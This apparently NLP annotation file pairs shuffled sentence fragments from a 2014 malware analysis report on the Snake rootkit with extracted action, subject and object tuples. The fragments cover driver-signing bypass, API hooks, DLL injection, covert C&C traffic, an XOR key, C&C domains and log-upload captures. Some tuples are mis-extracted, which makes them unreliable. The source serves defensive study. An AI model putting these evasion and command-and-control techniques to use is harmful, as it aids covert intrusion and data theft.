communications as quiet as possible": [{"keep": {"A": "keep", "O": ["its network communications", "as quiet as possible"]}}], " When the data arrives, it is intercepted with the\nFwpsCopyStreamDataToBuffer0() API, and then scanned for the presence of the hidden commands from C&C": [{"is intercepted": {"A": "is intercepted", "O": ["it", "When the data arrives", "with the FwpsCopyStreamDataToBuffer0() API"]}, "scanned": {"A": "scanned", "O": ["for the presence of the hidden commands from C&C", "it"]}}], "\n\n\nBy \u2018sniffing\u2019 all the requests, it can now inspect the traffic, looking for and then parsing GET/POST HTTP requests and also SMTP\ncommunications, in order to distinguish commands addressed to itself": [{"distinguish": {"A": "distinguish", "S": "it", "O": ["commands addressed to itself"]}, "looking for and then parsing": {"A": "looking for and then parsing", "S": "it", "O": ["GET/POST HTTP requests and also SMTP communications"]}, "inspect": {"A": "inspect", "S": "it", "O": ["the traffic"]}}], "\nNDIS, in turn, calls the miniport driver\u2019s\nMiniportSendNetBufferLists() function to forward\nthe data to an underlying miniport driver": [{"calls": {"A": "calls", "S": "NDIS", "O": ["the miniport driver\u2019s MiniportSendNetBufferLists() function"]}}], " Its ability to hibernate, staying fully inactive for a number of days, makes its detection during that time very\ndifficult": [{"makes": {"A": "makes", "O": ["its detection during that time", "very difficult"]}}, {"staying": {"A": "staying", "O": ["fully inactive", "for a number of days"]}}], "\n\nAs long as the user is not using the Internet, Snake stays dormant too, as there is no process that communicates with the web\nservers": [{"stays": {"A": "stays", "S": "Snake", "O": ["As long as the user is not using the Internet", "dormant"]}}], " The message queue file\ncontains configuration data and the libraries that will be injected into usermode processes": [{"be injected": {"A": "be injected", "O": ["into usermode processes", "libraries"]}}], " on TDI_RECEIVE TDI event or ClientEventReceive() event notification triggered\nthrough its TDI Filter Driver), it parses all incoming HTTP and SMTP traffic to see if it can be authenticated as Snake traffic": [{"parses": {"A": "parses", "S": "it", "O": ["all incoming HTTP and SMTP traffic"]}, "be authenticated": {"A": "be authenticated", "S": "it", "O": ["it", "as Snake traffic"]}}], " Unlike traditional worm\ntechniques, this process is rather manual, but its danger is in the fact that the attacker can flexibly craft new attack methods,\nadjusting them to the hosts present within the network, thus preying on the weakest (least updated, most vulnerable) victims along\nits path": [{"adjusting": {"A": "adjusting", "S": "the attacker", "O": ["to the hosts present within the network", "them"]}}], "\n\nAs a result, whenever the data is saved into the volume Hd1, it will be scrambled on-the-fly, and reflected in the persistent storage\nfile hotfix.dat, which is physically located within the rootkit\u2019s \u2018home\u2019 directory:\n<figure>\n   Z:\\WINDOWS\\$NtuninstallQ817473$>dir\n     Volume in drive Z has no label": [{"is saved": {"A": "is saved", "O": ["the data", "into the volume Hd1"]}}, {"be scrambled": {"A": "be scrambled", "O": ["on-the-fly", "it"]}, "reflected": {"A": "reflected", "O": ["in the persistent storage file hotfix.dat", "it"]}}], "\n\nHiding a few DNS/HTTP requests among busy network traffic allows Snake rootkit to stay unnoticed": [{"Hiding": {"A": "Hiding", "S": "Snake rootkit", "O": ["a few DNS/HTTP requests", "among busy network traffic"]}, "stay": {"A": "stay", "S": "Snake rootkit", "O": ["unnoticed"]}}], "\n\nThe purpose of this DLL is to be injected into the user-mode processes": [{"be injected": {"A": "be injected", "O": ["into the user-mode processes", "this DLL"]}}], " OK\n      03:52:06 1336: GET /D/pub.txt\n      03:52:07 1336: Http status: 200\n      03:52:07 1336: recv 1/1\n      03:52:07 DownLoad 1 command(s)\n</list>\nOnce acknowledged, it asks the server for a command, and the server returns a new command to execute:\n<list>\n      03:52:11 1404: Connect swim.onlinewebshop.net                    type(0)..": [{"asks": {"A": "asks", "S": "it", "O": ["for a command", "the server"]}}, {"returns": {"A": "returns", "S": "the server", "O": ["a new command to execute"]}}], " In order to decrypt it, the malware first\napplies the XOR mask to the bytes that start from offset 0x40:\n<list>\n    1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6g\n    s923HL34x2f5cvd0fk6c1a0s\n</list>\nAn identical XOR mask was also used by Agent.BTZ": [{"decrypt": {"A": "decrypt", "S": "the malware", "O": ["it"]}, "applies": {"A": "applies", "S": "the malware", "O": ["to the bytes that start from offset 0x40", "the XOR mask"]}}], "\n\nTo encrypt data stored on its virtual partitions, the driver sets a hook for another API:\n<list>\n         IofCallDriver()\n</list>\nTo re-infect the usermode process svchost.exe and to re-enable its network drivers, the rootkit hooks these APIs:\n<list>\n    \u2022\t ZwCreateThread\n    \u2022\t ZwCreateUserProcess\n</list>\n\n</section>\n<section>\n<heading>\nWFP CALLOUT DRIVER</heading>\nSnake then proceeds to the task of deep packet inspection and modification": [{"encrypt": {"A": "encrypt", "S": "the driver", "O": ["data stored on its virtual partitions"]}, "sets": {"A": "sets", "S": "the driver", "O": ["a hook for another API"]}}, {"hooks": {"A": "hooks", "S": "the rootkit", "O": ["these APIs"]}, "re-infect": {"A": "re-infect", "S": "the rootkit", "O": ["the usermode process svchost.exe"]}, "re-enable": {"A": "re-enable", "S": "the rootkit", "O": ["its network drivers"]}}], "\n\n   \u2022\t   In the first mode, it relies on Windows Internet (WinINet) APIs, such as HttpOpenRequest(), HttpSendRequest(),\n        InternetReadFile(), etc": [{"relies on": {"A": "relies on", "S": "it", "O": ["Windows Internet (WinINet) APIs, such as HttpOpenRequest(), HttpSendRequest(), InternetReadFile(), etc"]}}], " In order to find the variable in kernel memory, the Snake\ndropper loads a copy of the NT core image (ntoskrnl.exe), locates the import of CI.dll\u2019s function CiInitialize(), and then\nSepInitializeCodeIntegrity() within it": [{"loads": {"A": "loads", "S": "the Snake dropper", "O": ["a copy of the NT core image (ntoskrnl.exe)"]}, "locates": {"A": "locates", "S": "the Snake dropper", "O": ["SepInitializeCodeIntegrity() within it", "the import of CI.dll\u2019s function CiInitialize()"]}}], "\n\nAnother set of hooks it sets is designed to hide the presence of the Snake components on the system:\n<list>\n    \u2022\t ZwQuerySystemInformation\n    \u2022\t ZwQueryInformationProcess\n    \u2022\t ZwClose\n    \u2022\t ZwTerminateProcess\n</list>\nThe driver then watches for all userland processes to see if they load any web pages": [{"watches": {"A": "watches", "S": "The driver", "O": ["for all userland processes", "to see if they load any web pages"]}}, {"hide": {"A": "hide", "S": "Another set of hooks", "O": ["the presence of the Snake components on the system"]}}, {"sets": {"A": "sets", "S": "it", "O": ["Another set of hooks"]}}], " a browser)\n\n\n                                                                                                            2\n                                                                                    Embedded\n                       Snake\u2019s Kernel Mode                                          DLL Module\n                        Driver, with the DLL\n                       module embedded in it\n</figure>\n\nThe diagram illustrates the operation steps 1-4:\n\n    1     First, the malicious driver with the embedded DLL module injects that DLL into a system process,\n          such as services.exe; once loaded, the DLL will function in the \u2018pipe server\u2019 mode": [{"function": {"A": "function", "S": "the DLL", "O": ["in the \u2018pipe server\u2019 mode"]}}, {"injects": {"A": "injects", "S": "the malicious driver with the embedded DLL module", "O": ["into a system process, such as services.exe", "that DLL"]}}], "\n</list>\nApart from GET/POST requests, the pipe clients (infected usermode processes) may also ask the pipe server to perform other\noperations on their behalf, such as saving data into a temporary file, copy/delete files, save configuration data into the registry\nunder the aforementioned ShellCore value": [{"ask": {"A": "ask", "S": "the pipe clients (infected usermode processes)", "O": ["the pipe server"]}}, {"copy": {"A": "copy", "S": "the pipe server", "O": ["files"]}, "perform": {"A": "perform", "S": "the pipe server", "O": ["GET"]}, "saving": {"A": "saving", "S": "the pipe server", "O": ["data", "into a temporary file"]}, "save": {"A": "save", "S": "the pipe server", "O": ["under the aforementioned ShellCore value", "into the registry", "configuration data"]}, "delete": {"A": "delete", "S": "the pipe server", "O": ["files"]}}], "\n\nThe hook handler for ZwTerminateProcess() checks if the process being shut down is svchost.exe": [{"checks": {"A": "checks", "S": "The hook handler for ZwTerminateProcess()", "O": ["if the process being shut down is svchost.exe"]}}], " The Snake dropper contains both 32-bit and 64-bit unsigned drivers, and it can successfully load its\nunsigned 64-bit driver on a 64-bit version of Windows XP \u2013 as driver signing is not enforced it does not have to resort to any tricks\nunder this OS version": [{"load": {"A": "load", "S": "it", "O": ["its unsigned 64-bit driver", "on a 64-bit version of Windows XP"]}}], "\n\nFull list of the named pipes used for communications is provided below:\n<list>\n    \u2022\t \\Device\\NamedPipe\\isapi_http\n    \u2022\t \\Device\\NamedPipe\\isapi_log\n    \u2022\t \\Device\\NamedPipe\\isapi_dg\n    \u2022\t \\Device\\NamedPipe\\services_control\n</list>\nMessages submitted into the pipes are wrapped into the structures": [{"used": {"A": "used", "O": ["the named pipes", "for communications"]}}, {"submitted": {"A": "submitted", "O": ["into the pipes", "Messages"]}}], "\n\nNext, the driver sets up the hooks for the following kernel-mode APIs:\n<list>\n    \u2022\t ZwCreateThread\n    \u2022\t ZwCreateUserProcess\n    \u2022\t ZwShutdownSystem\n</list>\nAfter that, it calls PsSetCreateProcessNotifyRoutine() in order to be notified whenever a new process is started": [{"be notified": {"A": "be notified", "O": ["it", "whenever a new process is started"]}}, {"calls": {"A": "calls", "S": "it", "O": ["PsSetCreateProcessNotifyRoutine()"]}}, {"sets up": {"A": "sets up", "S": "the driver", "O": ["for the following kernel-mode APIs", "the hooks"]}}], "\n<figure>\n    Intercepting Network Data\n\n\n                                NdisMIndicateReceiveNetBufferLists()\n\n     NDIS Protocol                                        Miniport\n                                  NDIS\n        Driver                                             Driver\n\n       ProtocolReceiveNetBufferLists()\n</figure>\n<figure>\n\n    Sending Network Data\n\n                                    MiniportSendNetBufferLists()\n\n\n     NDIS Protocol                                       Miniport\n                                  NDIS\n        Driver                                            Driver\n\n           NdisSendNetBufferLists()\n</figure>\nWhenever the underlying miniport driver\nreceives data from the network, it calls NDIS\nby invoking a data receive indication function\nNdisMIndicateReceiveNetBufferLists()": [{"invoking": {"A": "invoking", "S": "it", "O": ["a data receive indication function NdisMIndicateReceiveNetBufferLists()"]}}, {"receives": {"A": "receives", "S": "the underlying miniport driver", "O": ["data", "from the network"]}}], "\n\n</section>\n\n\n<footer>                                                      BAE Systems Applied Intelligence: Snake Rootkit Report 2014        7</footer>\n\n\f\n<section>\n<heading>ROOTKIT EXECUTION</heading>\nWhen first executed, the driver creates device named \\Device\\vstor32 with a symbolic link \\DosDevices\\vstor32": [{"creates": {"A": "creates", "S": "the driver", "O": ["with a symbolic link \\DosDevices\\vstor32", "device named \\Device\\vstor32"]}}], "\n\nThe ZwClose() hook handler is used to inject the DLL module into the userland processes": [{"inject": {"A": "inject", "S": "The ZwClose() hook handler", "O": ["into the userland processes", "the DLL module"]}}], "\n\nWith its own miniport handler functions, it can send/receive data by using a private TCP/IP stack, bypassing all firewall hooks, and\nmaking its open ports invisible to scanners": [{"making": {"A": "making", "S": "it", "O": ["invisible to scanners", "its open ports"]}, "send": {"A": "send", "S": "it"}, "bypassing": {"A": "bypassing", "S": "it"}, "receive": {"A": "receive", "S": "it"}}], "\n\nThe ability to update the driver and then rely on its communication capabilities means that the components of Snake are flexible,\nmaking possible the existence of the hybrid (kernel-centric and usermode-centric) architectures": [{"rely on": {"A": "rely on", "O": ["its communication capabilities"]}}, {"update": {"A": "update", "O": ["the driver"]}}], "\n\nHowever, as soon as the user goes online, the driver intercepts that event and then immediately injects the malicious DLL module\ninto the process that initiated connection (the browser)": [{"intercepts": {"A": "intercepts", "S": "the driver", "O": ["that event", "as soon as the user goes online"]}, "injects": {"A": "injects", "S": "the driver", "O": ["into the process that initiated connection", "the malicious DLL module"]}}], "\n\nWhen run as a command line tool, with its logic defined with the command line switches, this tool enumerates other network hosts\nand detects what Windows RPC services are enabled at the endpoints": [{"enumerates": {"A": "enumerates", "S": "this tool", "O": ["other network hosts"]}, "detects": {"A": "detects", "S": "this tool", "O": ["what Windows RPC services are enabled at the endpoints"]}}], "\n\nNext, it drops a DLL into the %windows% directory - the DLL is carried in the body of the driver as a binary chunk with\nXOR 0xAA applied on top of it, so the driver decrypts it first": [{"drops": {"A": "drops", "S": "it", "O": ["a DLL", "into the %windows% directory"]}}, {"applied": {"A": "applied", "O": ["XOR 0xAA", "on top of it"]}}], " The usermode DLLs are still\ninjected into the system processes to perform high-level tasks": [{"are still injected": {"A": "are still injected", "O": ["to perform high-level tasks", "into the system processes", "The usermode DLLs"]}}], "\n\n\n</section>\n<section>\n<heading>\nNDIS PROTOCOL DRIVER</heading>\nThe Snake rootkit registers itself as Network Driver Interface Specification (NDIS) protocol driver": [{"registers": {"A": "registers", "S": "The Snake rootkit", "O": ["as Network Driver Interface Specification (NDIS) protocol driver", "itself"]}}], "\n\nSnake sets filters at the layers FWPM_LAYER_STREAM_V4 and FWPM_LAYER_ALE_FLOW_ESTABLISHED_V4 in the TCP/\nIP stack, so that its callout driver is notified whenever a TCP connection is established by a browser": [{"is notified": {"A": "is notified", "O": ["whenever a TCP connection is established by a browser", "its callout driver"]}}], " It then uses these identifiers to write a message to and read a message from the associated named pipes": [{"read": {"A": "read", "S": "It", "O": ["a message"]}, "write": {"A": "write", "S": "It", "O": ["a message"]}}], "\n\nBy using this function the remote attacker can identify any potentially exploitable hosts located in the same network as the victim": [{"identify": {"A": "identify", "S": "the remote attacker", "O": ["any potentially exploitable hosts located in the same network as the victim"]}}], "\n\nThe handlers of the hooks above along with the notification callback allow Snake to stay persistent on a system, being able to infect\nany newly created processes, and restore its driver file in case it gets deleted": [{"stay": {"A": "stay", "S": "Snake", "O": ["persistent on a system"]}, "restore": {"A": "restore", "S": "Snake", "O": ["its driver file", "in case it gets deleted"]}, "infect": {"A": "infect", "S": "Snake", "O": ["any newly created processes"]}}], " The fingerprinting allows it to reveal the following characteristics for each host found in the network:\n<list>\n   \u2022\t   the version of the operating system\n   \u2022\t   version of the service pack\n   \u2022\t   the installed network services\n</list>\nThe data it retrieves is encrypted and saved into a configuration file %system%\\vtmon.bin": [{"is encrypted": {"A": "is encrypted", "O": ["The data"]}, "saved": {"A": "saved", "O": ["The data", "into a configuration file %system%\\vtmon.bin"]}}, {"reveal": {"A": "reveal", "S": "it", "O": ["for each host found in the network", "the following characteristics"]}}], "\n\nNext, it calculates and confirms a CRC32 checksum within the command, further decrypts the data by using the Number Theory\nLibrary (NTL), and makes sure the command is destined to the current host by matching the ID field in it": [{"makes sure": {"A": "makes sure", "S": "it", "O": ["the command is destined to the current host", "by matching the ID field in it"]}, "calculates and confirms": {"A": "calculates and confirms", "S": "it", "O": ["within the command", "a CRC32 checksum"]}, "decrypts": {"A": "decrypts", "S": "it", "O": ["the data", "by using the Number Theory Library (NTL)"]}}], " On a 64-bit OS, it will install a 64-bit driver": [{"install": {"A": "install", "S": "it", "O": ["On a 64-bit OS", "a 64-bit driver"]}}], "\n\nOn 64-bit versions of Windows Vista and above it behaves differently": [{"behaves": {"A": "behaves", "S": "it", "O": ["differently", "On 64-bit versions of Windows Vista and above"]}}], "\nIt may rely on the following Internet Media types (MIME types) for data exfiltration:\n<list>\n   \u2022\t     application/x-shockwave-flash\n   \u2022\t     image/pjpeg\n   \u2022\t     image/jpeg\n   \u2022\t     image/x-xbitmap\n   \u2022     image/gif\n   \u2022     application/msword\n   \u2022     application/vnd.ms-excel\n   \u2022     application/vnd.ms-powerpoint\n</list>\nRequest type it uses can either be POST of GET, and C&C server resource name is /default.asp": [{"uses": {"A": "uses", "S": "it"}}, {"be": {"A": "be", "S": "Request type", "O": ["POST"]}}, {"is": {"A": "is", "S": "C&C server resource name", "O": ["/default.asp"]}}, {}, {"rely on": {"A": "rely on", "S": "It", "O": ["the following Internet Media types (MIME types)", "for data exfiltration"]}}], "\n\nThe files within that directory are used by the rootkit to store configuration and log data": [{"are used": {"A": "are used", "S": "rootkit", "O": ["The files within that directory"]}, "store": {"A": "store", "S": "rootkit", "O": ["configuration and log data"]}}], "\n\n</section>\n\n\n<footer>                                                      BAE Systems Applied Intelligence: Snake Rootkit Report 2014        24</footer>\n\n\f\n<section>\n<heading>RECONNAISSANCE TOOL</heading>\nOne of the Snake components that could have been downloaded from a remote C&C server, was identified as a network\nreconnaissance tool": [{"been downloaded": {"A": "been downloaded", "O": ["One of the Snake components", "from a remote C&C server"]}, "was identified": {"A": "was identified", "O": ["as a network reconnaissance tool", "One of the Snake components"]}}], " If so, it will install a TDI filter driver": [{"install": {"A": "install", "S": "it", "O": ["a TDI filter driver"]}}], " explorer.exe) are:\n<list>\n   \u2022\t     32-bit Windows OS:\n           \u2022\t rkctl_Win32.dll\n           \u2022\t inj_snake_Win32.dll\n\n   \u2022\t     64-bit Windows OS:\n           \u2022\t rkctl_x64.dll\n           \u2022\t inj_snake_x64.dll\n</list>\nThe rkctl_Win32.dll/rkctl_x64.dll module uses the following hard-coded named pipe for communications:\n<list>\n\\\\.\\pipe\\services_control\n</list>\nThe remote commands it receives appear to be designed to control other components of Snake:\n<list>\n   \u2022\t     tc_cancel\n   \u2022\t     config_read_uint32\n   \u2022\t     tr_free\n   \u2022\t     tr_alloc\n   \u2022\t     tc_send_request\n   \u2022\t     tr_write_pipe\n   \u2022\t     snake_modules_command\n   \u2022\t     t_setoptbin\n   \u2022      tc_free_data\n   \u2022      tc_get_reply\n   \u2022      tc_read_request_pipe\n   \u2022      tc_send_request_bufs\n   \u2022      t_close\n   \u2022      tc_socket\n   \u2022      snake_free\n   \u2022      snake_alloc\n</list>\nThe inj_snake_Win32.dll/inj_snake_x64.dll module exports 61 functions": [{"uses": {"A": "uses", "S": "The rkctl_Win32.dll/rkctl_x64.dll module", "O": ["the following hard-coded named pipe", "for communications"]}}, {"receives": {"A": "receives", "S": "it", "O": ["The remote commands"]}}, {"control": {"A": "control", "S": "The remote commands", "O": ["other components of Snake"]}}], "\n\nThis delegation of tasks is designed to keep infected processes under the radar of the behavioural analysis tools for as long as\npossible": [{"keep": {"A": "keep", "S": "This delegation of tasks", "O": ["under the radar of the behavioural analysis tools", "infected processes", "for as long as possible"]}}], "\n\nThe reason behind such behaviour is that the driver is acting in this mode like a proxy, routing requests from other infected hosts to\na remote C&C server": [{"is acting": {"A": "is acting", "S": "the driver", "O": ["like a proxy", "in this mode"]}, "routing": {"A": "routing", "S": "the driver", "O": ["to a remote C&C server", "requests from other infected hosts"]}}], "\n\n Other files that may also be found on the virtual volume are: klog, conlog, dump, rkng_inst.exe,\n\n where rkng_inst.exe could be the name of the original dropper, and other log files could potentially contain executed command\n outputs, intercepted keystrokes, and other output logs": [{"contain": {"A": "contain", "S": "other log files", "O": ["executed command outputs"]}}, {"intercepted": {"A": "intercepted", "O": ["keystrokes"]}}], "\n\nThe remote commands received by this Snake DLL module are designed to set up various communication parameters:\n<list>\n     \u2022\t    http_log\n     \u2022\t    http_no_pragma_cache\n     \u2022\t    http_no_accept\n     \u2022\t    proxy_useragent\n     \u2022\t    proxy_bypass\n     \u2022\t    proxy_server\n     \u2022\t    proxy_discover\n     \u2022\t    proxy_passwd\n     \u2022\t    proxy_user\n     \u2022\t    check_inet\n     \u2022     redir_str\n     \u2022     http_max_opt\n     \u2022     http_option\n     \u2022     http_uri\n     \u2022     no_server_hijack\n     \u2022     imp_level\n     \u2022     net_password\n     \u2022     net_user\n     \u2022     write_peer_nfo\n     \u2022     read_peer_nfo\n</list>\nTo post the data, the DLL can use the following User-Agent string \u201cMozilla/4.0 (compatible; MSIE 6.0)\u201d": [{"post": {"A": "post", "S": "the DLL", "O": ["the data"]}}, {"received": {"A": "received", "S": "this Snake DLL module", "O": ["The remote commands"]}}], "\n\nOnce injected, the module initiates polling from one of the hard-coded C&C servers": [{"initiates": {"A": "initiates", "S": "the module", "O": ["polling", "from one of the hard-coded C&C servers"]}}], "\n\nThe first partition is created with the following steps:\n<list>\n    \u2022\t   the driver creates a 100Mb (0x6400000 bytes) file %windows%\\$NtUninstallQ817473$\\hotfix.dat by calling\n         IoCreateFile() API\n\n    \u2022\t   then it creates a section object with the flags SEC_COMMIT and SEC_NOCACHE (0x18000000) by calling\n         ZwCreateSection(); the flags mean the file is mapped into memory, the entire range of pages will be committed\n\n    \u2022\t   next, it maps a view of the created section into the virtual address space by calling ZwMapViewOfSection()\n\n    \u2022\t   finally, it creates device \\Device\\RawDisk1 from the section map and mounts it as \\\\.\\Hd1\n</list>\nThe hook installed by the rootkit on IofCallDriver() API provides on-the-fly data encryption/decryption whenever that data is\nwritten to or read from the volume": [{"read": {"A": "read", "O": ["that data", "from the volume to is written that data"]}, "is written": {"A": "is written", "O": ["that data", "to the volume from read that data"]}}, {"provides": {"A": "provides", "S": "The hook", "O": ["on-the-fly data encryption/decryption"]}}, {"is created": {"A": "is created", "O": ["The first partition", "with the following steps"]}}, {"installed": {"A": "installed", "S": "the rootkit", "O": ["on IofCallDriver() API", "The hook"]}}], "\n</list>\n\n\n\n<footer>                                                               BAE Systems Applied Intelligence: Snake Rootkit Report 2014   10</footer>\n\fThe command it receives is called UpLoad, so it uploads all the collected logs to the server, and then cleans out those logs:\n<list>\n    03:52:16 UpLoad: http upload 4 file(s)": [{"uploads": {"A": "uploads", "S": "it", "O": ["all the collected logs", "to the server"]}, "cleans out": {"A": "cleans out", "S": "it", "O": ["those logs"]}}, {"receives": {"A": "receives", "S": "it", "O": ["The command"]}}], " It is also sophisticated, using complex techniques for evading host defences and\nproviding the attackers covert communication channels": [{"using": {"A": "using", "S": "It", "O": ["complex techniques", "for evading host defences"]}, "providing": {"A": "providing", "S": "It", "O": ["covert communication channels", "the attackers"]}}], " The registration is ensured with creation of the following\nregistry entries:\n<list>\n    ErrorControl = 0\n    Group = \u201cStreams Drivers\u201d\n    ImagePath = %windows%\\$NtUninstallQ817473$\\fdisk.sys\n    Start = 1 [SYSTEM]\n    Type = 1\n\nin the newly created registry key\n\n    HKEY_LOCAL_MACHINE\\System\\CurrentControlSer\\Services\\Ultra3\n</list>\nThe driver then flags the following events with the notification purposes:\n<list>\n    \\BaseNamedObjects\\{B93DFED5-9A3B-459b-A617-59FD9FAD693E}\n    \\BaseNamedObjects\\shell.{F21EDC09-85D3-4eb9-915F-1AFA2FF28153}\n</list>\nThe rootkit then places a number of the hooks": [{"is ensured": {"A": "is ensured", "O": ["The registration", "with creation of the following registry entries"]}}, {"flags": {"A": "flags", "S": "The driver", "O": ["the following events", "with the notification purposes"]}}, {"places": {"A": "places", "S": "The rootkit", "O": ["a number of the hooks"]}}], "\nOne of the parameters defines the pipe name(s) that the DLL should use for its communications": [{"use": {"A": "use", "S": "the DLL", "O": ["the pipe name(s)", "for its communications"]}}], "\n\n\nWhenever the client establishes connections, the TDI driver will also \u2018pulse\u2019 the \\BaseNamedObjects\\wininet_activate\nevent, just like the WPF driver\u2019s component of it, in order to notify the userland service about the event": [{"\u2018pulse\u2019": {"A": "\u2018pulse\u2019", "S": "the TDI driver", "O": ["the \\BaseNamedObjects\\wininet_activate event", "Whenever the client establishes connections"]}}], " By\nknowing what RPC services are running, it can successfully fingerprint all network hosts by mimicking the Metasploit\u2019s logic of OS\nfingerprinting via SMB": [{"fingerprint": {"A": "fingerprint", "S": "it", "O": ["by mimicking the Metasploit\u2019s logic of OS fingerprinting via SMB", "all network hosts"]}}], " This file is then further encrypted with\nan NTL-based (Number Theory Library) algorithm and is uploaded by the usermode-centric Snake rootkit to the C&C server, along\nwith other configuration files, such as mtmon.sdb, mtmon32.sdb, gstatsnd.bin, gstat.bin, gstat32.bin, and other log\nfiles found in the %windows%\\$NtUninstallQ[random]$ directory": [{"is uploaded": {"A": "is uploaded", "O": ["This file", "to the C&C server", "along with other configuration files, such as mtmon.sdb, mtmon32.sdb, gstatsnd.bin, gstat.bin, gstat32.bin, and other log files found in the %windows%\\$NtUninstallQ[random]$ directory", "by the usermode-centric Snake rootkit"]}, "is then further encrypted": {"A": "is then further encrypted", "O": ["This file", "with an NTL-based (Number Theory Library) algorithm"]}}], " These tools can be used for covert\ncommunications in a number of different modes, some of which present significant challenges for\ntraditional security technologies to detect": [{"be used": {"A": "be used", "S": "These tools", "O": ["in a number of different modes", "for covert communications"]}}, {"present": {"A": "present", "S": "some of which", "O": ["significant challenges for traditional security technologies to detect"]}}], "\n\nThis driver is set up above a miniport driver (a driver that communicates with the physical device) and below a protocol driver (a\ndriver that implements a protocol, e.g": [{"is set up": {"A": "is set up", "S": "This driver", "O": ["below a protocol driver", "above a miniport driver"]}}], " The structures appear to contain headers to allow the pipe\nserver, that runs within an infected userland module, to identify the messages first and then unwrap the structures accordingly": [{"identify": {"A": "identify", "S": "the pipe server", "O": ["the messages"]}}], " The infected hosts are capable\nof transferring the following peer-2-peer commands defining fragment size, reliability parameters, new peer information, peer\nimpersonation flags, etc.:\n<list>\n    \u2022\t frag_size\n    \u2022\t frag_no_scrambling\n    \u2022\t peer_frag_size\n    \u2022\t read_peer_nfo\n    \u2022\t write_peer_nfo\n    \u2022\t imp_level\n    \u2022\t reliable_n_tries\n    \u2022\t reliable_keepalive\n    \u2022\t reliable_rtt\n    \u2022\t reliable_padding\n    \u2022\t reliable_no_keepalive\n    \u2022\t m2b_raw\n    \u2022\t psk\n    \u2022\t key\n</list>\nOnce the incoming data is authenticated and decrypted, the driver passes it to the DLL by using memory pipes": [{"is authenticated and decrypted": {"A": "is authenticated and decrypted", "O": ["the incoming data"]}}], "\n\nConfiguration parameters along with the initial set of domain names are hard-coded within the body of the DLL": [{"are hard-coded": {"A": "are hard-coded", "O": ["within the body of the DLL", "the initial set of domain names"]}}], " Then it parses the function\u2019s code to locate the offset of the variable": [{"parses": {"A": "parses", "S": "it", "O": ["the function\u2019s code", "to locate the offset of the variable"]}}], "\nOne approach is to delegate the network communication engine to usermode code, backed up by a usermode rootkit": [{"delegate": {"A": "delegate", "O": ["to usermode code", "the network communication engine"]}}], "\n\nOnce located, the content of the variable nt!g_CiEnabled is patched in kernel memory and the 64-bit unsigned driver is loaded": [{"is loaded": {"A": "is loaded", "O": ["the 64-bit unsigned driver"]}}], " In another model, the network communications are handled by a kernel mode driver - i.e": [{"are handled": {"A": "are handled", "S": "a kernel mode driver", "O": ["the network communications"]}}], " As there are no validations made for the UserBuffer an\nattacker can craft such input parameters that will define address within kernel memory to patch and the data to patch it with:\n<code>\n    01     /**\n    02       * Device I/O Control entry point": [{"craft": {"A": "craft", "S": "an attacker", "O": ["such input parameters that will define address within kernel memory to patch and the data to patch it"]}}], " It\u2019s worth noting that Agent.BTZ used the same XOR key for its\nlogs as the most recent variants:\n<list>\n1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s\n</list>\nLog files created by the latest samples of Snake, compiled in 2013 and 2014, were successfully decrypted with the same XOR key": [{"created": {"A": "created", "S": "the latest samples of Snake", "O": ["Log files"]}}, {"used": {"A": "used", "S": "Agent.BTZ", "O": ["the same XOR key", "for its logs"]}}], "\n\nTo write data, it opens the device with CreateFile(\u201c\\\\.\\vstor32\u201d), then calls DeviceIoControl() API on its handle with\nIOCTL code of 0x222038": [{"calls": {"A": "calls", "S": "it", "O": ["with IOCTL code of 0x222038", "DeviceIoControl() API", "on its handle"]}, "write": {"A": "write", "S": "it", "O": ["data"]}, "opens": {"A": "opens", "S": "it", "O": ["the device", "with CreateFile(\u201c\\\\.\\vstor32\u201d)"]}}], "\n\nFor example, the message headers could be:\n<list>\n    \u2022\t domc.np\n    \u2022\t frag.np\n</list>\n\nOnce received from the pipes and unwrapped/decoded, the data is then handled by the usermode DLL as per the data intention -\nwhether it\u2019s a traffic sniffing task, a peer-2-peer client logic, a logging task, or a task of saving received files into the virtual volumes": [{"received": {"A": "received", "O": ["the data", "from the pipes"]}}], "\n\nThe purpose of this behaviour is to blend Snake\u2019s traffic with the browser traffic, bypassing the firewalls, and keeping a low profile\nat the same time": [{"blend": {"A": "blend", "S": "this behaviour", "O": ["with the browser traffic", "Snake\u2019s traffic"]}}, {"keeping": {"A": "keeping", "O": ["a low profile"]}}, {"bypassing": {"A": "bypassing", "O": ["the firewalls"]}}], " Some variants of Snake carry the DLL modules that can be\ninstalled as a service, to be run within taskhost.exe or services.exe processes": [{"be installed": {"A": "be installed", "O": ["as a service", "DLL modules"]}, "be run": {"A": "be run", "O": ["DLL modules", "within taskhost.exe or services.exe processes"]}}], "\nThis device is used for userland/kernel communications": [{"is used": {"A": "is used", "O": ["for userland/kernel communications", "This device"]}}], "   Time           Source               Destination         Protocol Length Info\n\n 38   44.290689000   192.168.202.131      192.168.202.2       DNS   77 Standard query 0x6ad3 A winter.site11.com\n 41   44.292830000   192.168.202.2        192.168.202.131     DNS   93 Standard query response 0x6ad3 A 31.170.161.136\n 45   44.518185000   192.168.202.131      31.170.161.136      HTTP 219 GET /D/pub.txt HTTP/1.1\n 47   44.743999000   31.170.161.136       192.168.202.131     HTTP 474 HTTP/1.1 302 Found (text/html)\n \u2193\n 84   45.990199000   192.168.202.131      31.170.161.136      HTTP     233    GET /D/1/f42cce984070b8ab1c0 HTTP/1.1\n 86   46.216079000   31.170.161.136       192.168.202.131     HTTP     474    HTTP/1.1 302 Found (text/html)\n 94   46.525887000   192.168.202.131      31.170.164.249      HTTP     217    GET /? HTTP/1.1\n101   46.939359000   192.168.202.131      192.168.202.2       DNS       82    Standard query 0x5ae5 A swim.onlinewebshop.net\n102   46.940914000   192.168.202.2        192.168.202.131     DNS       98    Standard query response 0x5ae5 A 83.125.22.197\n107   47.287205000   192.168.202.131      83.125.22.197       HTTP     224    GET /D/pub.txt HTTP/1.1\n109   48.219805000   83.125.22.197        192.168.202.131     HTTP     330    HTTP/1.1 200 OK (text/html)\n \u2193\n118   48.813394000   192.168.202.131      192.168.202.2       DNS   82 Standard query 0x5362 A july.mypressonline.com\n119   48.814837000   192.168.202.2        192.168.202.131     DNS   98 Standard query response 0x5362 A 83.125.22.197\n123   49.131675000   192.168.202.131      83.125.22.197       HTTP 224 GET /D/pub.txt HTTP/1.1\n125   49.780323000   83.125.22.197        